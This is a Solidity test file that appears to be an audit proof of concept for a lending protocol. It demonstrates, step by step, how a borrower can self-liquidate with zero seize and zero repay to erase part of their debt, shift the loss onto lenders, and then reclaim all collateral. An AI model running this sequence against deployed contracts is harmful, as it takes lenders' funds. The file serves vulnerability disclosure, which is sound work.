// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {WAD, ORACLE_PRICE_SCALE} from "../src/libraries/ConstantsLib.sol";
import {IMidnight, Market, Offer, CollateralParams} from "../src/interfaces/IMidnight.sol";
import {UtilsLib} from "../src/libraries/UtilsLib.sol";
import {Oracle} from "./helpers/Oracle.sol";
import {BaseTest} from "./BaseTest.sol";

// FINDING: A borrower can call `liquidate` with seizedAssets==0 && repaidUnits==0 on their OWN
// liquidatable position to realize "bad debt" WITHOUT any collateral being seized.
//
// `badDebt` is computed with the worst-case maxLif discount:
//     badDebt = debt - sum(collateral_i * price_i / maxLif_i)
// Because maxLif > 1, badDebt can be strictly positive even when the position is still SOLVENT
// (collateralValue >= debt). Normally this overstatement is harmless because bad-debt realization
// is *coupled* with seizing the collateral that justifies it. But the (0,0) liquidation realizes
// the bad debt while leaving ALL collateral with the borrower.
//
// Net effect: a solvent borrower wipes `badDebt` units of their own debt for free; the loss is
// socialized to the lenders (lossFactor). The borrower keeps every token of collateral.
contract PocSelfBadDebt is BaseTest {
    using UtilsLib for uint256;
    using UtilsLib for uint128;

    Market internal market;
    bytes32 internal id;

    function setUp() public override {
        super.setUp();
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: 0.77e18,
                maxLif: maxLif(0.77e18, 0.25e18),
                oracle: address(oracle1)
            })
        );
        market.rcfThreshold = 0;
        id = toId(market);
        deal(address(loanToken), address(this), type(uint256).max);
    }

    function testSelfRealizeBadDebtOnSolventPosition() public {
        uint256 units = 98e18; // debt

        // Borrower posts collateral exactly at the LLTV boundary (collateral = debt / lltv).
        collateralize(market, borrower, units);
        // A single lender funds the whole position; totalUnits == lender credit == 98e18.
        setupMarket(market, units);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 debtBefore = midnight.debtOf(id, borrower);
        uint256 collatBefore = midnight.collateral(id, borrower, 0);
        assertEq(lenderCreditBefore, units, "lender credit");
        assertEq(debtBefore, units, "borrower debt");

        // Price drops so the collateral is worth ~100 units: liquidatable (maxDebt 77 < 98) but
        // still SOLVENT (collateral value 100 >= debt 98).
        uint256 collatValueTarget = 100e18;
        uint256 newPrice = collatValueTarget.mulDivDown(ORACLE_PRICE_SCALE, collatBefore);
        oracle1.setPrice(newPrice);

        uint256 collatValue = uint256(collatBefore).mulDivDown(newPrice, ORACLE_PRICE_SCALE);
        assertGe(collatValue, debtBefore, "position must be SOLVENT (collateral >= debt)");
        // sanity: it is liquidatable in normal mode (unhealthy).
        assertFalse(midnight.isHealthy(market, id, borrower), "should be unhealthy / liquidatable");

        // The BORROWER liquidates their OWN position with zero seize / zero repay.
        // No collateral leaves the position, no loan token is transferred.
        vm.prank(borrower);
        (uint256 seized, uint256 repaid) =
            midnight.liquidate(market, 0, 0, 0, borrower, false, borrower, address(0), "");
        assertEq(seized, 0, "no collateral seized");
        assertEq(repaid, 0, "no units repaid");

        uint256 debtAfter = midnight.debtOf(id, borrower);
        uint256 collatAfter = midnight.collateral(id, borrower, 0);

        // Collateral untouched.
        assertEq(collatAfter, collatBefore, "collateral must be untouched");

        // Debt was reduced by the realized bad debt, for FREE.
        uint256 badDebtWiped = debtBefore - debtAfter;
        assertGt(badDebtWiped, 0, "borrower wiped debt for free");
        emit log_named_decimal_uint("debt wiped for free (units)", badDebtWiped, 18);

        // The position is now even more comfortably solvent.
        assertGe(collatValue, debtAfter, "still solvent after wipe");

        // The loss was socialized to the lender: their up-to-date credit dropped by ~badDebt.
        (uint128 lenderCreditAfter,,) = midnight.updatePositionView(market, id, lender);
        uint256 lenderLoss = lenderCreditBefore - lenderCreditAfter;
        emit log_named_decimal_uint("lender loss (units)", lenderLoss, 18);
        assertApproxEqAbs(lenderLoss, badDebtWiped, 2, "lender loss == debt wiped");

        // ===== Realize the profit: repay at par + reclaim ALL collateral =====
        // Borrower repays the (reduced) remaining debt at par and pulls out 100% of collateral.
        deal(address(loanToken), borrower, debtAfter);
        vm.startPrank(borrower);
        midnight.repay(market, debtAfter, borrower, address(0), "");
        midnight.withdrawCollateral(market, 0, collatAfter, borrower, borrower);
        vm.stopPrank();

        assertEq(midnight.debtOf(id, borrower), 0, "debt cleared");
        assertEq(midnight.collateral(id, borrower, 0), 0, "all collateral reclaimed");

        // Borrower paid only `debtAfter` to clear a `debtBefore` obligation while keeping all
        // collateral => stole `badDebtWiped` from the lender.
        emit log_named_decimal_uint("borrower saved / lender lost (units)", badDebtWiped, 18);
    }
}
